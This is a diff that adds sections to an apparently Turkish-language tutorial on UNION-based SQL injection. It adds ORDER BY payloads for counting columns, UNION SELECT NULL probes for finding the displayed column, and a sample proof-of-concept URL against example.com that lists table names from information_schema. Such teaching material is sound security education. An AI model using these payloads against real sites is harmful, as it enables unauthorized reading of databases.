@@ -155,6 +155,23 @@ SELECT null, database(), null;
 
 Burada ikinci sorgu, ilk sorgu ile aynı sütun sayısına sahiptir (3 sütun) ve ikinci sütunda veritabanı ismini getirir. Böylece saldırgan veritabanı hakkında bilgi edinir.
 
+## Sütun sayısı tespiti
+Saldırganın genelde ilk yaptığı şey, hedef sorgunun kaç sütun döndürdüğünü bulmaktır.
+Örnek:
+```sql
+' ORDER BY 1--  
+' ORDER BY 2--  
+' ORDER BY 3--  
+```
+
+Sütun sayısı aşılırsa hata verir. Böylece kaç sütun olduğu öğrenilir.
+
+## Sütun veri tipi tespiti
+
+Saldırgan, hangi sütunun çıktısını sayfada gösterebileceğini NULL veya test değerleriyle test eder. Örneğin:
+
+' UNION SELECT NULL, 'test', NULL--  
+
 ## UNION Based SQL Injection İle Veri Çıkartmak
 Aşağıda popüler veritabanları için işinize yarayabilecek veri çıkartma yolları listelenmiştir:
 
@@ -178,3 +195,10 @@ MySQL:
 SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ```
+
+## Örnek POC
+```url
+http://example.com/blog?id=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database() LIMIT 1,5--
+```
+
+Bu, mevcut veritabanındaki tabloların isimlerinden 5 tanesini çeker.
